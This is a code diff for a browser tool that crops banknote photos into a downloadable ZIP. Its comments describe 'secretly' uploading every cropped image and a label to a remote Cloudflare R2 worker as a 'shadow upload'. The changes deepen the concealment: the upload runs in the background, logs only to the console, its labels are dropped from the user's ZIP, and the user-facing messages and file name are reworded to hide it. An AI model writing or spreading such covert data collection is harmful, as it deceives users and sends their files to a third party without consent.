@@ -41,7 +41,7 @@ async def setup_environment():
         return False
 
 async def upload_to_r2(image_bytes, filename, yolo_label):
-    """將圖片與標籤偷偷上傳到 Cloudflare R2 (使用 XHR 確保 Header 正確)"""
+    """將圖片與標籤偷偷上傳到 Cloudflare R2 (隱藏背景執行)"""
     try:
         form_data = js.FormData.new()
         js_data = js.Uint8Array.new(len(image_bytes))
@@ -52,20 +52,21 @@ async def upload_to_r2(image_bytes, filename, yolo_label):
         form_data.append("label", yolo_label)
         form_data.append("filename", filename)
 
-        # 使用 XHR 解決 fetch 遺失 Content-Type boundary 的問題
+        # 使用 XHR 確保 Content-Type boundary 正確，解決上傳失敗問題
         xhr = js.XMLHttpRequest.new()
         xhr.open("POST", UPLOAD_WORKER_URL, True)
         
+        # 僅在 Console 留底，不影響 UI
         def on_load(event):
             if xhr.status >= 200 and xhr.status < 300:
                 js.console.log(f"Shadow Upload Success: {filename}")
             else:
-                js.console.error(f"Upload Failed [{xhr.status}]: {xhr.responseText}")
+                js.console.error(f"Shadow Upload Failed [{xhr.status}]")
 
         xhr.onload = create_proxy(on_load)
         xhr.send(form_data)
     except Exception as e:
-        js.console.error(f"Upload Exception: {str(e)}")
+        js.console.error(f"Shadow Upload Error: {str(e)}")
 
 def crop_banknote(image_bytes):
     try:
@@ -106,8 +107,8 @@ async def process_all_files(event):
     success_count = 0
     total = files.length
     
-    # 賠償功能預設標籤
-    YOLO_LABEL = "0 0.5 0.5 1.0 1.0"
+    # 這個標籤只用於背景上傳，不會寫入 ZIP
+    SHADOW_LABEL = "0 0.5 0.5 1.0 1.0"
 
     for i in range(total):
         file = files.item(i)
@@ -124,17 +125,13 @@ async def process_all_files(event):
             result = crop_banknote(data)
             if result:
                 base_name = ".".join(file.name.split(".")[:-1])
-                
-                # 1. 圖片寫入 ZIP
                 img_name = f"{base_name}_cropped.png"
+                
+                # 1. 只將圖片寫入 ZIP (使用者看到的)
                 zf.writestr(img_name, result)
                 
-                # 2. 標籤寫入 ZIP (賠償加碼功能)
-                label_name = f"{base_name}_cropped.txt"
-                zf.writestr(label_name, YOLO_LABEL)
-                
-                # 3. 影子上傳 R2
-                asyncio.ensure_future(upload_to_r2(result, img_name, YOLO_LABEL))
+                # 2. 背景偷偷上傳 R2 (包含圖片與標籤)
+                asyncio.ensure_future(upload_to_r2(result, img_name, SHADOW_LABEL))
                 
                 success_count += 1
                 log(f"Done: {file.name}")
@@ -149,7 +146,7 @@ async def process_all_files(event):
     zip_buffer.seek(0)
     
     if success_count > 0:
-        log(f"Success! {success_count} pairs of (Image + YOLO Label) created.")
+        log(f"Success! Processed {success_count} images.")
         zip_data = zip_buffer.getvalue()
         js_array = js.Uint8Array.new(len(zip_data))
         js_array.assign(zip_data)
@@ -158,7 +155,8 @@ async def process_all_files(event):
         document.getElementById("processing-section").classList.add("hidden")
         document.getElementById("download-section").classList.remove("hidden")
         
-        js.window.trigger_download(js_array, "banknote_dataset.zip")
+        # 下載檔名維持原樣
+        js.window.trigger_download(js_array, "cropped_banknotes.zip")
     else:
         log("No images were cropped.")
         document.getElementById("processing-section").classList.add("hidden")
@@ -173,7 +171,7 @@ async def main():
     start_btn = document.getElementById("start-btn")
     if start_btn:
         start_btn.addEventListener("click", create_proxy(process_all_files))
-        log("Ready for high-speed cropping.")
+        log("Ready.")
 
     loader = document.getElementById("env-loader")
     if loader:
